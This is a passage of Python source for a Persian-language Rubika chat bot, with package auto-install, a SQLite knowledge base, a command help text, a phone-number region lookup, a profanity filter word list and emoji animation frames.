import os

try:
    import requests
except ImportError :
    os.system("pip install requests")
try:
    from rubpy import Client, filters, utils,enums,exceptions,Rubino
    from rubpy.types import Updates
except ImportError :
    os.system("pip install rubpy ")
import random
import shutil
import datetime
from random import randint
from urllib.parse import quote
import threading
import time
from datetime import datetime
import json
import sqlite3
import urllib.request
import re
from rubpy.enums import ParseMode
from PIL import Image
from io import BytesIO
from re import search
from time import strftime
import khayyam
import phonenumbers
from phonenumbers import geocoder, carrier
from googletrans import Translator
try:
    from deep_translator import GoogleTranslator
except ImportError :
    os.system("pip install  deep_translator")
try:   
    import khayyam
except ImportError :
    os.system("pip install khayyam  ")
try:  
    from gtts import  gTTS
except ImportError :
    
    os.system("pip install gtts ")
import rubpy

knowledge_base_file = "knowledge_base.json"
knowledge_base_db_file = "knowledge_base.db"
HASHTAG_RE = re.compile(r'\#\w+')
LINK_RE = re.compile(r'https?://\S+')
admin =["u0GK6O10f42a5f2006c9e1fa9f4cf0ce"]
# SQLite connection and cursor
conn = sqlite3.connect(knowledge_base_db_file)
cursor = conn.cursor()

# Create a table if it doesn't exist
cursor.execute('''CREATE TABLE IF NOT EXISTS knowledge_base (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )''')
Number= ["1","2","3","4","5","6","7","8","9","10","تمام"]
Stikers = ["❌ ✅ ❌ ✅ ❌ ✅ ❌ ✅","✅ ❌ ✅ ❌ ✅ ❌ ✅ ❌","🔴 🔵 🔴 🔵 🔴 🔵 🔴 🔵","🟢 🟡 🟢 🟡 🟢 🟡 🟢 🟡","🌸 🍀 🌸 🍀 🌸 🍀 🌸 🍀","🌞 🌛 🌞 🌛 🌞 🌛 🌞 🌛"] * 2
list_love =[
    "😍 ",
    "❤️",
    "💑 ",
    "💘",
    "💖",
    "💞",
    "💓",
    "💗",
    "🎉 ",
    "💕 ",
    "💘",
    
] 

    
    
    
    
    
list_order ='''
📚 دستورات ربات:
🔹 مونث: تبدیل متن به صدای زن
🔹 مذکر: تبدیل متن به صدای مرد
🔹 image: جستجوی تصویر بر اساس متن و ارسال آن
🔹 برای چت باهوش مصنوعی قبل هر متن +بزارید مثال:
+سلام
🔹 time,تایم
🔹برای ارسال لینک عکس قبل متن خود بده رابنویسید
🔹تاریخ
🔹برای ارسال فونت انگلیسی قبل هرمتن fontبنویسید
🔹 برای ویس انگلیسی قبل هر متن voice
🔹برای ارسال فونت فارسی قبل متن فونت بنویسید
🔹نام راندم اینطوری /name
🔹 برای تشخیص اعداد اول اینطوری
num:2
🔹برای محاسبه bmiاینطوری
bmi:w180,h90
🔹سپاه
🔹سیگما
🔹 بای هوش مصنوعی بخش دیگر قبل هر متن سوال بنویسید بعد متن خود را بزارید
🔹 برای ساخت لگو قبل متن خود logo بنویسید
logo iran
🔹برای تبدیل متن به زبان عبری اینگونه:
عبری:سلام
🔹 برای برعکس کردن یک متن اینطوری :
برعکس امیرحسین
برای اینکه بفهمی کلماتت چقدره اینطوری:
len:amir
🔹 برای چت بات هوش مصنوعی لاما قبل هرمتن *بزارید
برای چت باهوش مصنوعی برای سوال خود اینونه بنویسید:
سوال سلام خوبی
برای به دست اوردن اطلاعات شماره اینطوری :
phone:+980933***
🔹 برای چت باهوش مصنوعی دیگه هم میتونید از/استفاده کنید
🔹 حالا میرسیم بخش دستورات گروهی:
برای اجرای اهنگ راندم درویسکال بنویسید اهنگ 
🔹برای سرچ موزیک واجرای آن درویسکال قبل هرمتن موزیک بنویسید
🔹چیستان
🔹بخش فقط پیوی ودارای انیمیشن:
🔹دنس
🔹قلب
🔹عشق
🔹ساعت
🔹استیکر
برای ارتباط بامالک:
@Sepah_cyber1383
کانال ما:
https://t.me/pythonsource1384
@Python_Source_1403

'''
def get_phone_number_info(phone_number):
    try:
      
        parsed_phone_number = phonenumbers.parse(phone_number, "IR")
        
        # دریافت اطلاعات مربوط به موقعیت جغرافیایی
        location = geocoder.description_for_number(parsed_phone_number, "fa")
        
        # دریافت اطلاعات مربوط به اپراتور
        operator = carrier.name_for_number(parsed_phone_number, "fa")
        
        # بازگشت اطلاعات به ترتیب مطلوب
        return (phone_number, parsed_phone_number.country_code, parsed_phone_number.national_number, location, operator)
    except phonenumbers.NumberParseException as e:
        return (phone_number, None, None, None, None)
photo_lock = False
fohs = ['کیر', 'کون', 'جنده', 'کونی', 'گایید', 'گاییدم', 'گاییده', 'گاییدی', 'گاییدن', 'کوس', 'کس', 'کسده', 'کیرم',
            'کیری', 'کیرم دهنت', 'کوسده', 'کصده', 'کص', 'کوص', 'کونتو', 'گاییدمت', 'زنا زاده', 'خارتو', 'سیک', 'بسیک',
            'بصیک', 'صیک', 'ننه پولی', 'اوبی', 'نگامت', 'ساکر', 'صاکر', 'سکس', 'سکسی', 'صکص', 'سکص', 'صکس', 'صکصی',
            'کستو', 'کصتو', 'عن', 'گوه', 'گو خوردی', 'گو نخور', 'کسو',"کصمادرت","کص عمت","کصعمت","ss","sxs","مادرخراب","کیرسگ","گاییدنی","ربات مادرتو","کصکش","کسسسسسسس","کون","مذکر کص عمت","مونث کص عمت","عمه تو..","کص_مادر_رهبر","کص_مادر_روبیکا","بکیرم"]

bot = Client(name='Ai_bot', display_welcome=False,parse_mode=ParseMode.MARKDOWN)

Clock = [
    """
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
""",
    """
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
🕐🕐🕐🕐🕐
""",
    """
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
🕑🕑🕑🕑🕑
""",
    """
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
🕒🕒🕒🕒🕒
""",
    """
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
🕔🕔🕔🕔🕔
""",
    """
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
🕕🕕🕕🕕🕕
""",
    """
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
🕖🕖🕖🕖🕖
""",
    """
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
🕗🕗🕗🕗🕗
""",
    """
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
🕙🕙🕙🕙🕙
""",
    """
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
🕚🕚🕚🕚🕚
""",
    """
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
🕛🕛🕛🕛🕛
""",
    """
⏰⏰⏰⏰⏰
""",
    f"ساعت: {strftime('%H:%M:%S')}"
]
Dans = ["""
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟪🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟪🟧🟪🟧🟧🟧
🟧🟧🟧🟪🟪🟪🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟧🟦🟧🟪🟧🟧
🟧🟧🟪🟧🟧🟧🟪🟧🟧
🟧🟧🟪🟪🟪🟪🟪🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟦🟧🟦🟧🟪🟧
🟧🟪🟧🟦🟦🟦🟧🟪🟧
🟧🟪🟧🟧🟧🟧🟧🟪🟧
🟧🟪🟪🟪🟪🟪🟪🟪🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟪🟪🟪🟪🟪🟪🟪🟪🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟧⬜️🟧🟦🟧🟪
🟪🟧🟦🟧🟧🟧🟦🟧🟪
🟪🟧🟦🟦🟦🟦🟦🟧🟪
🟪🟧🟧🟧🟧🟧🟧🟧🟪
🟪🟪🟪🟪🟪🟪🟪🟪🟪
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧⬜️⬜️⬜️🟧🟦🟧
🟧🟦🟧🟧🟧🟧🟧🟦🟧
🟧🟦🟦🟦🟦🟦🟦🟦🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧⬜️⬜️⬜️⬜️⬜️🟧🟦
🟦🟧🟧🟧🟧🟧🟧🟧🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦
""",
        """
🟧🟧🟧🟧🟧🟧🟧🟧🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧⬜️⬜️⬜️⬜️⬜️⬜️⬜️🟧
🟧🟧🟧🟧🟧🟧🟧🟧🟧
""",
        """
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️
⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜️🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜⬜🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥⬜⬜⬜⬜⬜⬜🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜️🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥⬜⬜⬜⬜🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥⬜️⬜️🟥🟥🟥🟥
🟥🟥🟥🟥⬜⬜️🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥💙💙🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟦🟦🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟦🟦🟦🟦🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟦🟦🟦🟦🟨🟥🟥
🟥🟥🟨🟨🟨🟨🟨🟨🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟨🟨🟨🟨🟨🟨🟨🟨🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟨🟦🟦🟦🟦🟨🟨🟥
🟥🟨🟪🟨🟨🟨🟨🟪🟨🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟨🟨🟨🟨🟨🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟨🟦🟦🟦🟦🟨🟪🟥
🟥🟪🟪🟨🟨🟨🟨🟪🟪🟥
🟥🟪🟩🟩🟩🟩🟩🟩🟪🟥
🟥🟥🟥🟥🟥🟥🟥🟥🟥🟥
""",
        """
